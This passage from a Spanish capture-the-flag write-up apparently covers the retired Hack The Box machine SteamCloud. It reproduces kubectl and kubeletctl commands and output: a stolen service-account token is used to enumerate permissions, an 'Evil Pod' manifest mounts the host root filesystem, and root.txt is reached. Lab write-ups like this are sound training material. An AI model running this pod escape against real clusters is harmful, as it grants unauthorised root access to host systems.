<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># kubectl -s https://10.10.11.133:8443 --certificate-authority=content/ca.crt --token='eyJhbGciOiJSUzI1NiIsImtpZCI6IlJ5N3BJcURINldzSUt1SFFiU0xjRUtDbi1GQXY0R1lwRlRyX3ByRFZ3RGcifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjgwNjExNDYyLCJpYXQiOjE2NDkwNzU0NjIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImVmMWNlMzYzLTU0YzktNDQwNC1hODcwLTMzMWRmMDk2NmI0ZiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjMwNzc2NjdmLTVmZGUtNDhlYi1iMmM1LWQ5NmVhM2UyODgxNSJ9LCJ3YXJuYWZ0ZXIiOjE2NDkwNzkwNjl9LCJuYmYiOjE2NDkwNzU0NjIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.TZCj8E75Ludl2FQOP_VOy1lPxHG4JZfcfKv71CgK0faFXHMwN2rve1pqXbAT3LfYtEWC9ZiVJc36ZwXdZ-yO5NjgDkapKQKvfhilTbaR3BnkzL2rArZVuiEbdBn2QIzUJGtuAOmz3jWk_fS64JkHWQiAIO_vMoZsBZeXZtszgz8h_cR3Un7__H4HDJRf5djlgbQx83dN5xCVyLHdv0oXNLkpakhbT49KkD6nd7_h-G258itL6Qweg-ketm-UpjuKMTQ_fYdozuVf0Qvub7so5gDb3puajgKN9LMxIPzPt4YdcYXMzAfkmQtztn7y9K-_teOyOPRZyizXLB-o2X2WYw' auth can-i --list --namespace=nginx</span>
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   <span class="o">[]</span>                                    <span class="o">[]</span>               <span class="o">[</span>create]
selfsubjectrulesreviews.authorization.k8s.io    <span class="o">[]</span>                                    <span class="o">[]</span>               <span class="o">[</span>create]
                                                <span class="o">[</span>/.well-known/openid-configuration]   <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/api/<span class="k">*</span><span class="o">]</span>                              <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/api]                                <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/apis/<span class="k">*</span><span class="o">]</span>                             <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/apis]                               <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/healthz]                            <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/healthz]                            <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/livez]                              <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/livez]                              <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/openapi/<span class="k">*</span><span class="o">]</span>                          <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/openapi]                            <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/openid/v1/jwks]                     <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/readyz]                             <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/readyz]                             <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/version/]                           <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/version/]                           <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/version]                            <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/version]                            <span class="o">[]</span>               <span class="o">[</span>get]
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># kubectl -s https://10.10.11.133:8443 --certificate-authority=content/ca.crt --token='eyJhbGciOiJSUzI1NiIsImtpZCI6IlJ5N3BJcURINldzSUt1SFFiU0xjRUtDbi1GQXY0R1lwRlRyX3ByRFZ3RGcifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjgwNjExNDYyLCJpYXQiOjE2NDkwNzU0NjIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImVmMWNlMzYzLTU0YzktNDQwNC1hODcwLTMzMWRmMDk2NmI0ZiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjMwNzc2NjdmLTVmZGUtNDhlYi1iMmM1LWQ5NmVhM2UyODgxNSJ9LCJ3YXJuYWZ0ZXIiOjE2NDkwNzkwNjl9LCJuYmYiOjE2NDkwNzU0NjIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.TZCj8E75Ludl2FQOP_VOy1lPxHG4JZfcfKv71CgK0faFXHMwN2rve1pqXbAT3LfYtEWC9ZiVJc36ZwXdZ-yO5NjgDkapKQKvfhilTbaR3BnkzL2rArZVuiEbdBn2QIzUJGtuAOmz3jWk_fS64JkHWQiAIO_vMoZsBZeXZtszgz8h_cR3Un7__H4HDJRf5djlgbQx83dN5xCVyLHdv0oXNLkpakhbT49KkD6nd7_h-G258itL6Qweg-ketm-UpjuKMTQ_fYdozuVf0Qvub7so5gDb3puajgKN9LMxIPzPt4YdcYXMzAfkmQtztn7y9K-_teOyOPRZyizXLB-o2X2WYw' auth can-i --list                  </span>
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   <span class="o">[]</span>                                    <span class="o">[]</span>               <span class="o">[</span>create]
selfsubjectrulesreviews.authorization.k8s.io    <span class="o">[]</span>                                    <span class="o">[]</span>               <span class="o">[</span>create]
pods                                            <span class="o">[]</span>                                    <span class="o">[]</span>               <span class="o">[</span>get <span class="s2">"create"</span> list]
                                                <span class="o">[</span>/.well-known/openid-configuration]   <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/api/<span class="k">*</span><span class="o">]</span>                              <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/api]                                <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/apis/<span class="k">*</span><span class="o">]</span>                             <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/apis]                               <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/healthz]                            <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/healthz]                            <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/livez]                              <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/livez]                              <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/openapi/<span class="k">*</span><span class="o">]</span>                          <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/openapi]                            <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/openid/v1/jwks]                     <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/readyz]                             <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/readyz]                             <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/version/]                           <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/version/]                           <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/version]                            <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/version]                            <span class="o">[]</span>               <span class="o">[</span>get]
</code></pre></div></div>

<p>Procedemos de la siguiente forma</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Privesc creando un pod kubernetes</span>
<span class="c"># Creando un pod/ contenedor para montar todo el sistema victima en el directorio /mnt del pod que vamos a crear</span>

<span class="c"># kubectl -s https://10.10.11.133:8443 --certificate-authority=content/ca.crt --token='eyJhbGciOiJSUzI1NiIsImtpZCI6IlJ5N3BJcURINldzSUt1SFFiU0xjRUtDbi1GQXY0R1lwRlRyX3ByRFZ3RGcifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjgwNjExNDYyLCJpYXQiOjE2NDkwNzU0NjIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImVmMWNlMzYzLTU0YzktNDQwNC1hODcwLTMzMWRmMDk2NmI0ZiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjMwNzc2NjdmLTVmZGUtNDhlYi1iMmM1LWQ5NmVhM2UyODgxNSJ9LCJ3YXJuYWZ0ZXIiOjE2NDkwNzkwNjl9LCJuYmYiOjE2NDkwNzU0NjIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.TZCj8E75Ludl2FQOP_VOy1lPxHG4JZfcfKv71CgK0faFXHMwN2rve1pqXbAT3LfYtEWC9ZiVJc36ZwXdZ-yO5NjgDkapKQKvfhilTbaR3BnkzL2rArZVuiEbdBn2QIzUJGtuAOmz3jWk_fS64JkHWQiAIO_vMoZsBZeXZtszgz8h_cR3Un7__H4HDJRf5djlgbQx83dN5xCVyLHdv0oXNLkpakhbT49KkD6nd7_h-G258itL6Qweg-ketm-UpjuKMTQ_fYdozuVf0Qvub7so5gDb3puajgKN9LMxIPzPt4YdcYXMzAfkmQtztn7y9K-_teOyOPRZyizXLB-o2X2WYw' get pods nginx -o yaml &gt; pod.yaml</span>
</code></pre></div></div>

<p>Procedemos a leer el archivo guardado en formato yaml</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># cat pod.yaml </span>

apiVersion: v1                                                                                                                                                                                                     
metadata:                                                                                                                                                                                                          
  annotations:                                                                                                                                                                                                     
    kubectl.kubernetes.io/last-applied-configuration: |                                                                                                                                                            
      <span class="o">{</span><span class="s2">"apiVersion"</span>:<span class="s2">"v1"</span>,<span class="s2">"kind"</span>:<span class="s2">"Pod"</span>,<span class="s2">"metadata"</span>:<span class="o">{</span><span class="s2">"annotations"</span>:<span class="o">{}</span>,<span class="s2">"name"</span>:<span class="s2">"nginx"</span>,<span class="s2">"namespace"</span>:<span class="s2">"default"</span><span class="o">}</span>,<span class="s2">"spec"</span>:<span class="o">{</span><span class="s2">"containers"</span>:[<span class="o">{</span><span class="s2">"image"</span>:<span class="s2">"nginx:1.14.2"</span>,<span class="s2">"imagePullPolicy"</span>:<span class="s2">"Never"</span>,<span class="s2">"name"</span>:<span class="s2">"nginx"</span>,<span class="s2">"volumeMounts"</span>:[<span class="o">{</span><span class="s2">"m
ountPath"</span>:<span class="s2">"/root"</span>,<span class="s2">"name"</span>:<span class="s2">"flag"</span><span class="o">}]}]</span>,<span class="s2">"volumes"</span>:[<span class="o">{</span><span class="s2">"hostPath"</span>:<span class="o">{</span><span class="s2">"path"</span>:<span class="s2">"/opt/flag"</span><span class="o">}</span>,<span class="s2">"name"</span>:<span class="s2">"flag"</span><span class="o">}]}}</span>                                                                                                                  
  creationTimestamp: <span class="s2">"2022-04-04T12:31:02Z"</span>                                                                                                                                                                        
  name: nginx                                                                                                                                                                                                      
  namespace: default                                                                                                                                                                                               
  resourceVersion: <span class="s2">"514"</span>                                                                                                                                                                                           
  uid: ef1ce363-54c9-4404-a870-331df0966b4f                                                                                                                                                                        
spec:                                                                                                                                                                                                              
  containers:                                                                                                                                                                                                      
  - image: nginx:1.14.2                                                                                                                                                                                            
    imagePullPolicy: Never                                                                                                                                                                                         
    name: nginx                                                                                                                                                                                                    
    resources: <span class="o">{}</span>                                                                                                                                                                                                  
    terminationMessagePath: /dev/termination-log                                                                                                                                                                   
    terminationMessagePolicy: File                                                                                                                                                                                 
    volumeMounts:                                                                                                                                                                                                  
    - mountPath: /root                                                                                                                                                                                             
      name: flag                                                                                                                                                                                                   
    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount                                                                                                                                                     
      name: kube-api-access-xdscg                                                                                                                                                                                  
      readOnly: <span class="nb">true                                                                                                                                                                                               
  </span>dnsPolicy: ClusterFirst                                                                                                                                                                                          
  enableServiceLinks: <span class="nb">true                                                                                                                                                                                         
  </span>nodeName: steamcloud                                                                                                                                                                                             
  preemptionPolicy: PreemptLowerPriority                                                                                                                                                                           
  priority: 0                                                                                                                                                                                                      
  restartPolicy: Always
  schedulerName: default-scheduler
  securityContext: <span class="o">{}</span>
  serviceAccount: default
  serviceAccountName: default
  terminationGracePeriodSeconds: 30
  tolerations:                                                                                                                                                                                                     
  - effect: NoExecute                                                                                                                                                                                              
    key: node.kubernetes.io/not-ready                                                                                                                                                                              
    operator: Exists                                                                                                                                                                                               
    tolerationSeconds: 300                                                                                                                                                                                         
  - effect: NoExecute                                                                                                                                                                                              
    key: node.kubernetes.io/unreachable                                                                                                                                                                            
    operator: Exists                                                                                                                                                                                               
    tolerationSeconds: 300                                                                                                                                                                                         
  volumes:                                                                                                                                                                                                         
  - hostPath:                                                                                                                                                                                                      
      path: /opt/flag                                                                                                                                                                                              
      <span class="nb">type</span>: <span class="s2">""</span>                                                                                                                                                                                                     
    name: flag                                                                                                                                                                                                     
  - name: kube-api-access-xdscg                                                                                                                                                                                    
    projected:                                                                                                                                                                                                     
      defaultMode: 420                                                                                                                                                                                             
      sources:                                                                                                                                                                                                     
      - serviceAccountToken:                                                                                                                                                                                       
          expirationSeconds: 3607 
    path: token                                                                                                                                                                                      <span class="o">[</span>0/1525]
      - configMap:
          items:
          - key: ca.crt
            path: ca.crt
          name: kube-root-ca.crt
      - downwardAPI:
          items:
          - fieldRef:
              apiVersion: v1
              fieldPath: metadata.namespace
            path: namespace
status:
  conditions:
  - lastProbeTime: null
    lastTransitionTime: <span class="s2">"2022-04-04T12:31:02Z"</span>
    status: <span class="s2">"True"</span>
    <span class="nb">type</span>: Initialized
  - lastProbeTime: null
    lastTransitionTime: <span class="s2">"2022-04-04T12:31:04Z"</span>
    status: <span class="s2">"True"</span>
    <span class="nb">type</span>: Ready
  - lastProbeTime: null
    lastTransitionTime: <span class="s2">"2022-04-04T12:31:04Z"</span>
    status: <span class="s2">"True"</span>
    <span class="nb">type</span>: ContainersReady
  - lastProbeTime: null
    lastTransitionTime: <span class="s2">"2022-04-04T12:31:02Z"</span>
    status: <span class="s2">"True"</span>
    <span class="nb">type</span>: PodScheduled
  containerStatuses:
  - containerID: docker://f52ba68de2041b33f93bb3b11c30408cbee6d02ce1b2b1e9548abb04c3770a8d
    image: nginx:1.14.2
    imageID: docker-pullable://nginx@sha256:f7988fb6c02e0ce69257d9bd9cf37ae20a60f1df7563c3a2a6abe24160306b8d
    lastState: <span class="o">{}</span>
    name: nginx
    ready: <span class="nb">true
    </span>restartCount: 0
    started: <span class="nb">true
    </span>state:
      running:
        startedAt: <span class="s2">"2022-04-04T12:31:03Z"</span>
  hostIP: 10.10.11.133
  phase: Running
  podIP: 172.17.0.3
  podIPs:
  - ip: 172.17.0.3
  qosClass: BestEffort
  startTime: <span class="s2">"2022-04-04T12:31:02Z"</span>
<span class="nt">------------------------------</span> pod.yaml <span class="nt">--------------------------------------</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Lo modificamos a lo siguiente: 
<span class="nt">-------------------------------</span> Evil Pod.yaml <span class="nt">----------------------------------</span>
apiVersion: v1
kind: Pod
metadata:
  name: koh-pod
  namespace: default
spec:
  containers:
  - name: koh-pod
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /

<span class="nt">-----------------------------------------------</span>
</code></pre></div></div>
<p>Desplegando el Pod malicioso</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Lo desplegamos de la siguiente forma

<span class="c"># kubectl -s https://10.10.11.133:8443 --certificate-authority=content/ca.crt --token='eyJhbGciOiJSUzI1NiIsImtpZCI6IlJ5N3BJcURINldzSUt1SFFiU0xjRUtDbi1GQXY0R1lwRlRyX3ByRFZ3RGcifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjgwNjExNDYyLCJpYXQiOjE2NDkwNzU0NjIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImVmMWNlMzYzLTU0YzktNDQwNC1hODcwLTMzMWRmMDk2NmI0ZiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjMwNzc2NjdmLTVmZGUtNDhlYi1iMmM1LWQ5NmVhM2UyODgxNSJ9LCJ3YXJuYWZ0ZXIiOjE2NDkwNzkwNjl9LCJuYmYiOjE2NDkwNzU0NjIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.TZCj8E75Ludl2FQOP_VOy1lPxHG4JZfcfKv71CgK0faFXHMwN2rve1pqXbAT3LfYtEWC9ZiVJc36ZwXdZ-yO5NjgDkapKQKvfhilTbaR3BnkzL2rArZVuiEbdBn2QIzUJGtuAOmz3jWk_fS64JkHWQiAIO_vMoZsBZeXZtszgz8h_cR3Un7__H4HDJRf5djlgbQx83dN5xCVyLHdv0oXNLkpakhbT49KkD6nd7_h-G258itL6Qweg-ketm-UpjuKMTQ_fYdozuVf0Qvub7so5gDb3puajgKN9LMxIPzPt4YdcYXMzAfkmQtztn7y9K-_teOyOPRZyizXLB-o2X2WYw' apply -f pod.yaml</span>

pod/koh-pod created
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Verificamos los pods existentes

<span class="c"># kubeletctl -s 10.10.11.133 pods                                                                                     1 ⨯ 1 ⚙</span>
┌─────────────────────────────────────────────────────────────────────────────────┐
│                                Pods from Kubelet                                │
├────┬────────────────────────────────────┬─────────────┬─────────────────────────┤
│    │ POD                                │ NAMESPACE   │ CONTAINERS              │
├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│  1 │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │
│    │                                    │             │                         │
├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│  2 │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │
│    │                                    │             │                         │
├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│  3 │ koh-pod                            │ default     │ koh-pod                 │
│    │                                    │             │                         │
├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│  4 │ etcd-steamcloud                    │ kube-system │ etcd                    │
│    │                                    │             │                         │
├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│  5 │ storage-provisioner                │ kube-system │ storage-provisioner     │
│    │                                    │             │                         │
├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│  6 │ kube-proxy-zd55k                   │ kube-system │ kube-proxy              │
│    │                                    │             │                         │
├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│  7 │ coredns-78fcd69978-gl6gt           │ kube-system │ coredns                 │
│    │                                    │             │                         │
├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│  8 │ nginx                              │ default     │ nginx                   │
│    │                                    │             │                         │
├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│  9 │ kohh-pod                           │ default     │ kohh-pod                │
│    │                                    │             │                         │
├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 10 │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │
│    │                                    │             │                         │
└────┴────────────────────────────────────┴─────────────┴─────────────────────────┘

<span class="c"># kubeletctl -s 10.10.11.133 scan rce                                                                                 </span>
┌──────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                   Node with pods vulnerable to RCE                                   │
├────┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
│    │ NODE IP      │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
├────┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│    │              │                                    │             │                         │ RUN │
├────┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│  1 │ 10.10.11.133 │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │ -   │
├────┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│  2 │              │ koh-pod                            │ default     │ koh-pod                 │ +   │
├────┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│  3 │              │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │
├────┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│  4 │              │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │ -   │
├────┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│  5 │              │ kube-proxy-zd55k                   │ kube-system │ kube-proxy              │ +   │
├────┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│  6 │              │ coredns-78fcd69978-gl6gt           │ kube-system │ coredns                 │ -   │
├────┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│  7 │              │ nginx                              │ default     │ nginx                   │ +   │
├────┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│  8 │              │ kohh-pod                           │ default     │ kohh-pod                │ +   │
├────┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│  9 │              │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │ -   │
├────┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 10 │              │ storage-provisioner                │ kube-system │ storage-provisioner     │ -   │
└────┴──────────────┴────────────────────────────────────┴─────────────┴─────────────────────────┴─────┘
</code></pre></div></div>

<p>Procedemos a conectarnos al pod-malicioso creado</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Comprobando que tenemos el directorio / montado en /mnt en el nuestro pod desplegado
<span class="c"># kubeletctl -s 10.10.11.133 -p koh-pod -c koh-pod exec "ls -l /mnt"   </span>
total 60
lrwxrwxrwx   1 root root     7 Nov 30 11:36 bin -&gt; usr/bin
drwxr-xr-x   3 root root  4096 Nov 30 18:43 boot
drwxr-xr-x  16 root root  3080 Apr  4 12:29 dev
drwxr-xr-x  75 root root  4096 Jan 10 14:03 etc
drwxr-xr-x   3 root root  4096 Nov 30 11:44 home
lrwxrwxrwx   1 root root    31 Nov 30 11:38 initrd.img -&gt; boot/initrd.img-4.19.0-18-amd64
lrwxrwxrwx   1 root root    31 Nov 30 11:37 initrd.img.old -&gt; boot/initrd.img-4.19.0-14-amd64
lrwxrwxrwx   1 root root     7 Nov 30 11:36 lib -&gt; usr/lib
lrwxrwxrwx   1 root root     9 Nov 30 11:36 lib32 -&gt; usr/lib32
lrwxrwxrwx   1 root root     9 Nov 30 11:36 lib64 -&gt; usr/lib64
lrwxrwxrwx   1 root root    10 Nov 30 11:36 libx32 -&gt; usr/libx32
drwx------   2 root root 16384 Nov 30 11:36 lost+found
drwxr-xr-x   3 root root  4096 Nov 30 11:36 media
drwxr-xr-x   2 root root  4096 Nov 30 11:36 mnt
drwxr-xr-x   5 root root  4096 Jan 10 14:03 opt
dr-xr-xr-x 204 root root     0 Apr  4 12:28 proc
drwx------   4 root root  4096 Jan 10 14:03 root
drwxr-xr-x  20 root root   620 Apr  4 12:30 run
lrwxrwxrwx   1 root root     8 Nov 30 11:36 sbin -&gt; usr/sbin
drwxr-xr-x   2 root root  4096 Nov 30 11:36 srv
dr-xr-xr-x  13 root root     0 Apr  4 12:28 sys
drwxrwxrwt  11 root root  4096 Apr  4 13:47 tmp
drwxr-xr-x  14 root root  4096 Nov 30 12:17 usr
drwxr-xr-x  11 root root  4096 Nov 30 11:36 var
lrwxrwxrwx   1 root root    28 Nov 30 11:38 vmlinuz -&gt; boot/vmlinuz-4.19.0-18-amd64
lrwxrwxrwx   1 root root    28 Nov 30 11:37 vmlinuz.old -&gt; boot/vmlinuz-4.19.0-14-amd64
</code></pre></div></div>

<p>Sacando la pass root.txt</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># kubeletctl -s 10.10.11.133 -p koh-pod -c koh-pod exec "ls -l /mnt/root/"                                                 1 ⚙</span>
total 4
<span class="nt">-rw-r--r--</span> 1 root root 33 Apr  4 12:29 root.txt
</code></pre></div></div>

<p>SteamCloud Rooted ~ K0H4ck</p>

</div>


<div class="comments">
<div id="disqus_thread"></div>
<script>
 var disqus_config = function () {
     this.page.url = 'http://localhost:4000/2022/04/06/SteamCloud.html';
     this.page.identifier = '/2022/04/06/SteamCloud';
     this.page.title = 'Maquina Retirada SteamCloud de Hack The Box (Necesario VIP)';
 };

 (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
     var d = document, s = d.createElement('script');

     s.src = '//bitbrain-github-io.disqus.com/embed.js';

     s.setAttribute('data-timestamp', +new Date());
     (d.head || d.body).appendChild(s);
 })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>

</div>




<div class="related">
  <h2>related posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/2022/06/27/Trick.html">
            Maquina  Retirada Trick de Hack The Box (Necesario VIP)
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2022/06/15/Attacktive-Directory.html">
            Maquina Retirada Search de Hack The Box (Necesario VIP)
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2022/06/05/Search-AD.html">
            Maquina Retirada Search de Hack The Box (Necesario VIP)
          </a>
        </h3>
      </li>
    
  </ul>
</div>




  
  <h2>all tags</h2>
  <div class="tag-cloud"><a href="/tag/%26/" class="set-1">&</a> <a href="/tag/%2C/" class="set-1">,</a> <a href="/tag/1.8%2C/" class="set-1">1.8,</a> <a href="/tag/4.4%2C/" class="set-1">4.4,</a> <a href="/tag/8.6%2C/" class="set-1">8.6,</a> <a href="/tag/ad/" class="set-1">AD</a> <a href="/tag/adrotate%2C/" class="set-1">ADRotate,</a> <a href="/tag/aspreproast/" class="set-1">ASPREPRoast</a> <a href="/tag/asrep-roast%2C/" class="set-1">ASREP-Roast,</a> <a href="/tag/asreproast/" class="set-1">ASREPRoast</a> <a href="/tag/active/" class="set-1">Active</a> <a href="/tag/admin%2C/" class="set-1">Admin,</a> <a href="/tag/admins/" class="set-1">Admins</a> <a href="/tag/admins%2C/" class="set-1">Admins,</a> <a href="/tag/archivos/" class="set-1">Archivos</a> <a href="/tag/attack%2C/" class="set-1">Attack,</a> <a href="/tag/attacks/" class="set-1">Attacks</a> <a href="/tag/autopwn%2C/" class="set-1">AutoPwn,</a> <a href="/tag/azure/" class="set-1">Azure</a> <a href="/tag/bof%2C/" class="set-1">BOF,</a> <a href="/tag/bin/" class="set-1">Bin</a> <a href="/tag/blind%2C/" class="set-1">Blind,</a> <a href="/tag/bloodhound%2C/" class="set-1">BloodHound,</a> <a href="/tag/bruta%2C/" class="set-1">Bruta,</a> <a href="/tag/bruteforce%2C/" class="set-1">BruteForce,</a> <a href="/tag/bruteforce%2C/" class="set-1">Bruteforce,</a> <a href="/tag/burpsuite%2C/" class="set-1">Burpsuite,</a> <a href="/tag/bypass/" class="set-1">ByPass</a> <a href="/tag/bypass%2C/" class="set-1">Bypass,</a> <a href="/tag/ca/" class="set-1">CA</a> <a href="/tag/cgi-bin%2C/" class="set-1">CGI-BIN,</a> <a href="/tag/cron%2C/" class="set-1">CRON,</a> <a href="/tag/csrf/" class="set-1">CSRF</a> <a href="/tag/curl%2C/" class="set-1">CURL,</a> <a href="/tag/chkrootkit%2C/" class="set-1">Chkrootkit,</a> <a href="/tag/churrasco%2C/" class="set-1">Churrasco,</a> <a href="/tag/cifrado/" class="set-1">Cifrado</a> <a href="/tag/command/" class="set-1">Command</a> <a href="/tag/contracts%2C/" class="set-1">Contracts,</a> <a href="/tag/cracking/" class="set-1">Cracking</a> <a href="/tag/crackmapexec%2C/" class="set-1">Crackmapexec,</a> <a href="/tag/cron-taks%2C/" class="set-1">Cron-taks,</a> <a href="/tag/crontabs%2C/" 